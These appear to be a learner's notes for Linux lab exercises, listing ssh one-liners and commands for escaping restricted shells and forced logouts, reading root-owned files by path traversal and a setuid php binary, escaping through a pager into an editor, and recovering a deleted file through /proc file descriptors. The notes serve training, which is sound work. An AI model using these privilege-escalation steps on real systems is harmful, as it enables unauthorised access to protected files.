Kali commands useful for completing tasks from BSI:
TOPIC: [LINUX] Bypassing basic mechanisms of user block

task_1: Automatic logout
ssh -l USER IP "COMMAND" (execute COMMAND right after connecting to the server - in case the server has limited active time)

task_2: Access to files in the /root folder
(one-liner)
ssh -l USER IP "archive/file"
...

task_3: Access to files belonging to the root user
(one-liner)
ssh -l USER IP "archive/file"
...
'file to read': ../root/secret.txt

task_4: User privilege escalation
ssh -l USER IP
...
find / -perm /6000 2>/dev/null (find files with the 's-bit' set - allowing non-root users to execute the files with root privileges)
php7.4 -f /root/secret.txt (parse and execute file secret.txt using php7.4 script)
(one-liner)
ssh -l USER IP "php7.4 /root/secret.txt"

task_5: Shell other than Bash
ssh -l USER IP
ssh -l bob localhost -i .ssh/bob_key.pem (log into localhost as 'bob' user providing bob's private key)
['man more' and find 'v' option]
:e FILE (when editor is opened, ':e FILE' opens a FILE for edit)

task_6: Deleted file
ssh -l USER IP
ps aux (display all informations about running processes)
ps -x (display processes for the current user)
ls /proc/PID (display the data related to the process identified by PID number)
ls /proc/PID/fd (file descriptors of process with the given PID)
cat /proc/PID/fd/DESC (display the contents of the descriptor identified by DESC number)
(double one-liner?)
ssh -l USER IP "ps -x"
[copy PID of the specific process]
ssh -l USER IP "cat /proc/189/fd/3
